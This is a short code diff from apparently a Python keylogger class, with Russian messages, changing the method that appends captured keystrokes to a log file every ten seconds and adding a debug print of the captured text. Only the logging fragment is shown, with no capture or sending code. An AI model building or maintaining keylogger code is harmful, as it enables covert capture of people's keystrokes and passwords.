@@ -27,12 +27,12 @@ class KeyLogger:
     def report(self):
         if self.log.strip():
             try:
-                with open(self.path, "a") as file:
-                    file.write(self.log)
-                    logging.info(f"[+] Лог записан в файл {self.path}")
-                self.log = "" 
+                with open(self.path, "a", encoding="utf-8") as file:
+                    file.write(self.log + "\n")
+                    print(f"Записаны логи: {self.log}")  # Для отладки
+                    self.log = ""
             except Exception as e:
-                logging.error(f"[!!] Ошибка записи в файл кейлоггера: {e}")
+                print(f"Ошибка записи логов: {e}")
         self.timer = threading.Timer(10, self.report)
         self.timer.start()
 
